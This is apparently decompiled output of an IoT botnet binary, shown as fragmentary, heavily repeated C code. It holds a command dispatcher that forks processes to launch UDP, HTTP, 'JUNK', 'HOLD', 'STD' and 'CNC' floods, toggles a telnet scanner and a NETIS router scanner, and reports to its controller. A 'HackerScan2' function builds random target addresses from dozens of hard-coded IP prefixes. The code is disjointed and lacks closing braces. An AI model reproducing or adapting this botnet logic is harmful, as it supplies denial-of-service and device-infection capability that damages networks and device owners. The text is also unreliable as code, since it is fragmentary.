                                                                                                sendHOLD(v233, v240, v241);
                                                                                                __libc_close(v133);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v253, (int16_t)v251, v252);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v254, (int16_t)v251, v252);
                                                                                    if (listFork() == 0) {
                                                                                        sendCNC(v229, v227, v228);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendCNC(v230, v227, v228);
                                                                                            __libc_close(v133);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendJUNK(v242, v240, v241);
                                                                                                            sendSTD(v242, (int16_t)v240, v241);
                                                                                                            sendHOLD(v242, v240, v241);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendJUNK(v233, v240, v241);
                                                                                                                sendSTD(v233, (int16_t)v240, v241);
                                                                                                                sendHOLD(v233, v240, v241);
                                                                                                                __libc_close(v133);
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                                if (listFork() == 0) {
                                                                                                    sendJUNK(v242, v240, v241);
                                                                                                    sendSTD(v242, (int16_t)v240, v241);
                                                                                                    sendHOLD(v242, v240, v241);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendJUNK(v233, v240, v241);
                                                                                                        sendSTD(v233, (int16_t)v240, v241);
                                                                                                        sendHOLD(v233, v240, v241);
                                                                                                        __libc_close(v133);
                                                                                            if (listFork() == 0) {
                                                                                                sendCNC(v229, v227, v228);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendCNC(v230, v227, v228);
                                                                                                    __libc_close(v133);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendJUNK(v242, v240, v241);
                                                                                                                    sendSTD(v242, (int16_t)v240, v241);
                                                                                                                    sendHOLD(v242, v240, v241);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendJUNK(v233, v240, v241);
                                                                                                                        sendSTD(v233, (int16_t)v240, v241);
                                                                                                                        sendHOLD(v233, v240, v241);
                                                                                                                        __libc_close(v133);
                                        if (listFork() == 0) {
                                            sendJUNK(v186, v162, v163);
                                            while (true) {
                                                if (listFork() == 0) {
                                                    sendJUNK(v312, v162, v163);
                                                    __libc_close(v133);
                                            v210 = _strncmp((char *)*v127, "UDP", 4);
                                                v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                            v235 = listFork();
                                                                                sendJUNK(v242, v240, v241);
                                                                                sendSTD(v242, (int16_t)v240, v241);
                                                                                sendHOLD(v242, v240, v241);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendJUNK(v233, v240, v241);
                                                                                    sendSTD(v233, (int16_t)v240, v241);
                                                                                    sendHOLD(v233, v240, v241);
                                                                                    __libc_close(v133);
                                                                        v218 = listFork();
                                                                            sendCNC(v229, v227, v228);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v230, v227, v228);
                                                                                __libc_close(v133);
                                                                                            v235 = listFork();
                                                                                                sendJUNK(v242, v240, v241);
                                                                                                sendSTD(v242, (int16_t)v240, v241);
                                                                                                sendHOLD(v242, v240, v241);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendJUNK(v233, v240, v241);
                                                                                                    sendSTD(v233, (int16_t)v240, v241);
                                                                                                    sendHOLD(v233, v240, v241);
                                                                                                    __libc_close(v133);
                                                            v216 = listFork();
                                                                sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                    v235 = listFork();
                                                                                        sendJUNK(v242, v240, v241);
                                                                                        sendSTD(v242, (int16_t)v240, v241);
                                                                                        sendHOLD(v242, v240, v241);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendJUNK(v233, v240, v241);
                                                                                            sendSTD(v233, (int16_t)v240, v241);
                                                                                            sendHOLD(v233, v240, v241);
                                                                                            __libc_close(v133);
                                                                                v218 = listFork();
                                                                                    sendCNC(v229, v227, v228);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v230, v227, v228);
                                                                                        __libc_close(v133);
                                                                                                    v235 = listFork();
                                                                                                        sendJUNK(v242, v240, v241);
                                                                                                        sendSTD(v242, (int16_t)v240, v241);
                                                                                                        sendHOLD(v242, v240, v241);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendJUNK(v233, v240, v241);
                                                                                                            sendSTD(v233, (int16_t)v240, v241);
                                                                                                            sendHOLD(v233, v240, v241);
                                                                                                            __libc_close(v133);
                                                                                v215 = listFork();
                                                                                    sendUDP(v189, v172, v173, v174, v175, v148);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendUDP(v191, v172, v173, v174, v175, v148);
                                                                                v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                                            v235 = listFork();
                                                                                                                sendJUNK(v242, v240, v241);
                                                                                                                sendSTD(v242, (int16_t)v240, v241);
                                                                                                                sendHOLD(v242, v240, v241);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendJUNK(v233, v240, v241);
                                                                                                                    sendSTD(v233, (int16_t)v240, v241);
                                                                                                                    sendHOLD(v233, v240, v241);
                                                                                                                    __libc_close(v133);
                                                                                                        v218 = listFork();
                                                                                                            sendCNC(v229, v227, v228);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v230, v227, v228);
                                                                                                                __libc_close(v133);
                                                                                                                            v235 = listFork();
                                                                                                                                sendJUNK(v242, v240, v241);
                                                                                                                                sendSTD(v242, (int16_t)v240, v241);
                                                                                                                                sendHOLD(v242, v240, v241);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendJUNK(v233, v240, v241);
                                                                                                                                    sendSTD(v233, (int16_t)v240, v241);
                                                                                                                                    sendHOLD(v233, v240, v241);
                                                                                                                                    __libc_close(v133);
                                                                                            v216 = listFork();
                                                                                                sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                                                    v235 = listFork();
                                                                                                                        sendJUNK(v242, v240, v241);
                                                                                                                        sendSTD(v242, (int16_t)v240, v241);
                                                                                                                        sendHOLD(v242, v240, v241);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendJUNK(v233, v240, v241);
                                                                                                                            sendSTD(v233, (int16_t)v240, v241);
                                                                                                                            sendHOLD(v233, v240, v241);
                                                                                                                            __libc_close(v133);
                                                                                                                v218 = listFork();
                                                                                                                    sendCNC(v229, v227, v228);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendCNC(v230, v227, v228);
                                                                                                                        __libc_close(v133);
                                                                                                                                    v235 = listFork();
                                                                                                                                        sendJUNK(v242, v240, v241);
                                                                                                                                        sendSTD(v242, (int16_t)v240, v241);
                                                                                                                                        sendHOLD(v242, v240, v241);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() != 0) {
                                                                                                                                            sendJUNK(v233, v240, v241);
                                                                                                                                            sendSTD(v233, (int16_t)v240, v241);
                                                                                                                                            sendHOLD(v233, v240, v241);
                                                                                                                                            __libc_close(v133);
                                        v210 = _strncmp((char *)*v127, "UDP", 4);
                                            v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                        if (listFork() == 0) {
                                                                            sendJUNK(v242, v240, v241);
                                                                            sendSTD(v242, (int16_t)v240, v241);
                                                                            sendHOLD(v242, v240, v241);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendJUNK(v233, v240, v241);
                                                                                sendSTD(v233, (int16_t)v240, v241);
                                                                                sendHOLD(v233, v240, v241);
                                                                                __libc_close(v133);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v229, v227, v228);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v230, v227, v228);
                                                                            __libc_close(v133);
                                                                                        if (listFork() == 0) {
                                                                                            sendJUNK(v242, v240, v241);
                                                                                            sendSTD(v242, (int16_t)v240, v241);
                                                                                            sendHOLD(v242, v240, v241);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendJUNK(v233, v240, v241);
                                                                                                sendSTD(v233, (int16_t)v240, v241);
                                                                                                sendHOLD(v233, v240, v241);
                                                                                                __libc_close(v133);
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v229, v227, v228);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v230, v227, v228);
                                                                                    __libc_close(v133);
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v189, v172, v173, v174, v175, v148);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendUDP(v191, v172, v173, v174, v175, v148);
                                                                            v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v229, v227, v228);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendCNC(v230, v227, v228);
                                                                                                            __libc_close(v133);
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendCNC(v229, v227, v228);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendCNC(v230, v227, v228);
                                                                                                                    __libc_close(v133);
                                    if (listFork() == 0) {
                                        sendHOLD(v184, v158, v159);
                                        while (true) {
                                            if (listFork() == 0) {
                                                sendHOLD(v314, v158, v159);
                                            v210 = _strncmp((char *)*v127, "UDP", 4);
                                                v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                        v218 = listFork();
                                                                            sendCNC(v229, v227, v228);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v230, v227, v228);
                                                                                __libc_close(v133);
                                                            v216 = listFork();
                                                                sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                v218 = listFork();
                                                                                    sendCNC(v229, v227, v228);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v230, v227, v228);
                                                                                        __libc_close(v133);
                                                                                v215 = listFork();
                                                                                    sendUDP(v189, v172, v173, v174, v175, v148);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendUDP(v191, v172, v173, v174, v175, v148);
                                                                                v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                                        v218 = listFork();
                                                                                                            sendCNC(v229, v227, v228);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v230, v227, v228);
                                                                                                                __libc_close(v133);
                                                                                            v216 = listFork();
                                                                                                sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                                                v218 = listFork();
                                                                                                                    sendCNC(v229, v227, v228);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendCNC(v230, v227, v228);
                                                                                                                        __libc_close(v133);
                                                            if (listFork() == 0) {
                                                                sendJUNK(v186, v162, v163);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendJUNK(v187, v162, v163);
                                                                    __libc_close(v133);
                                                            v210 = _strncmp((char *)*v127, "UDP", 4);
                                                                v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                        v218 = listFork();
                                                                                            sendCNC(v229, v227, v228);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v230, v227, v228);
                                                                                                __libc_close(v133);
                                                                            v216 = listFork();
                                                                                sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                                v218 = listFork();
                                                                                                    sendCNC(v229, v227, v228);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v230, v227, v228);
                                                                                                        __libc_close(v133);
                                                                                                v215 = listFork();
                                                                                                    sendUDP(v189, v172, v173, v174, v175, v148);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendUDP(v191, v172, v173, v174, v175, v148);
                                                                                                v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                                                        v218 = listFork();
                                                                                                                            sendCNC(v229, v227, v228);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendCNC(v230, v227, v228);
                                                                                                                                __libc_close(v133);
                                                                                                            v216 = listFork();
                                                                                                                sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                                                                v218 = listFork();
                                                                                                                                    sendCNC(v229, v227, v228);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() != 0) {
                                                                                                                                        sendCNC(v230, v227, v228);
                                                                                                                                        __libc_close(v133);
                                        v210 = _strncmp((char *)*v127, "UDP", 4);
                                            v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v229, v227, v228);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v230, v227, v228);
                                                                            __libc_close(v133);
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v229, v227, v228);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v230, v227, v228);
                                                                                    __libc_close(v133);
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v189, v172, v173, v174, v175, v148);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendUDP(v191, v172, v173, v174, v175, v148);
                                                                            v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                        if (listFork() == 0) {
                                                            sendJUNK(v186, v162, v163);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendJUNK(v187, v162, v163);
                                                                __libc_close(v133);
                                                        v210 = _strncmp((char *)*v127, "UDP", 4);
                                                            v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                            if (listFork() == 0) {
                                                                                                sendUDP(v189, v172, v173, v174, v175, v148);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendUDP(v191, v172, v173, v174, v175, v148);
                                                                                            v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                        kill(v321, 9);
                        HackerPrint(v133, (int32_t)" OFF");
                        v202 = _strncmp((char *)*v127, "NETIS", 6);
                                HackerPrint(v133, (int32_t)"[NETIS] SCANNER Starting");
                                StartTheNetis();
                                v210 = _strncmp((char *)*v127, "UDP", 4);
                                    v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                if (listFork() == 0) {
                                                    sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v189, v172, v173, v174, v175, v148);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendUDP(v191, v172, v173, v174, v175, v148);
                                                                    v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                if (listFork() == 0) {
                                                    sendJUNK(v186, v162, v163);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendJUNK(v187, v162, v163);
                                                        __libc_close(v133);
                                                v210 = _strncmp((char *)*v127, "UDP", 4);
                                                    v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v189, v172, v173, v174, v175, v148);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendUDP(v191, v172, v173, v174, v175, v148);
                                                                                    v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                            if (listFork() == 0) {
                                                sendHOLD(v184, v158, v159);
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendHOLD(v185, v158, v159);
                                                v210 = _strncmp((char *)*v127, "UDP", 4);
                                                    v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v189, v172, v173, v174, v175, v148);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendUDP(v191, v172, v173, v174, v175, v148);
                                                                                    v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                if (listFork() == 0) {
                                                                    sendJUNK(v186, v162, v163);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendJUNK(v187, v162, v163);
                                                                        __libc_close(v133);
                                                                v210 = _strncmp((char *)*v127, "UDP", 4);
                                                                    v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendUDP(v189, v172, v173, v174, v175, v148);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendUDP(v191, v172, v173, v174, v175, v148);
                                                                                                    v212 = _strncmp((char *)*v127, "HTTP", 5);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(*v176, v201, (int16_t)v182, v199, v181, v180);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
                            int32_t v325 = __libc_fork(3); // 0x804f70a
                    HackerPrint(v133, (int32_t)"TELNET ON | OFF");
            __GI_inet_ntoa((int32_t)v326);
            HackerPrint(v133, (int32_t)"My IP: %s");
        HackerPrint(v133, (int32_t)"PONG!");
=================FUNCTION : HackerScan2 ===================
++++++++ FUNCTION START 7033
++++++++ FUNCTION END 8440
++++++++ FUNCTION LENGTH 1407
    int32_t v133 = random(); // 0x8049a41
    int32_t v135 = random(); // 0x8049a5d
    int32_t v137 = random(); // 0x8049a79
    int32_t v139 = random(); // 0x8049a95
    int32_t v141 = random(); // 0x8049ab1
        szprintf(v144, (int32_t)"112.5.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v145, (int32_t)"117.165.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v146, (int32_t)"85.3.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v147, (int32_t)"37.158.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v148, (int32_t)"95.9.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v149, (int32_t)"41.252.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v150, (int32_t)"58.71.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v151, (int32_t)"104.55.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v152, (int32_t)"78.186.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v153, (int32_t)"78.189.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v154, (int32_t)"221.120.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v155, (int32_t)"88.5.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v156, (int32_t)"41.254.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v157, (int32_t)"103.20.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v158, (int32_t)"103.47.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v159, (int32_t)"103.57.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v160, (int32_t)"45.117.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v161, (int32_t)"101.51.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v162, (int32_t)"137.59.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v163, (int32_t)"1.56.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v164, (int32_t)"1.188.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v165, (int32_t)"14.204.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v166, (int32_t)"27.0.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v167, (int32_t)"27.8.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v168, (int32_t)"27.50.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v169, (int32_t)"27.54.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v170, (int32_t)"27.98.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v171, (int32_t)"27.112.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v172, (int32_t)"27.192.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v173, (int32_t)"36.32.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v174, (int32_t)"36.248.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v175, (int32_t)"39.64.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v176, (int32_t)"42.4.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v177, (int32_t)"42.48.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v178, (int32_t)"42.52.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v179, (int32_t)"42.56.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v180, (int32_t)"42.63.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v181, (int32_t)"42.84.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v182, (int32_t)"42.176.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v183, (int32_t)"42.224.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v184, (int32_t)"42.176.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v185, (int32_t)"43.253.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v186, (int32_t)"43.230.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v187, (int32_t)"163.53.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v188, (int32_t)"43.230.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v189, (int32_t)"62.252.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v190, (int32_t)"43.245.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v191, (int32_t)"62.255.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v192, (int32_t)"123.25.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v193, (int32_t)"103.54.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v194, (int32_t)"27.255.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v195, (int32_t)"103.204.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v196, (int32_t)"123.24.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v197, (int32_t)"113.191.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v198, (int32_t)"81.100.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v199, (int32_t)"113.188.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v200, (int32_t)"113.189.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v201, (int32_t)"94.174.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v202, (int32_t)"14.160.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v203, (int32_t)"14.161.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v204, (int32_t)"14.162.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v205, (int32_t)"14.163.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v206, (int32_t)"14.164.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v207, (int32_t)"14.165.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v208, (int32_t)"14.166.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v209, (int32_t)"14.167.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v210, (int32_t)"14.168.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v211, (int32_t)"14.169.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v212, (int32_t)"14.170.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v213, (int32_t)"14.171.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v214, (int32_t)"14.172.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v215, (int32_t)"14.173.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v216, (int32_t)"14.174.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v217, (int32_t)"14.175.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v218, (int32_t)"14.176.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v219, (int32_t)"14.177.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v220, (int32_t)"14.178.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v221, (int32_t)"14.179.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v222, (int32_t)"14.180.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v223, (int32_t)"14.181.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v224, (int32_t)"14.182.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v225, (int32_t)"14.183.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v226, (int32_t)"14.184.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v227, (int32_t)"14.185.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v228, (int32_t)"14.186.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v229, (int32_t)"14.187.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v230, (int32_t)"14.188.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v231, (int32_t)"14.189.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v232, (int32_t)"14.190.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v233, (int32_t)"14.191.%d.%d", (int32_t)v131, (int32_t)v132);
        szprintf(v234, (int32_t)"45.121.%d.%d", (int32_t)v131, (int32_t)v132);
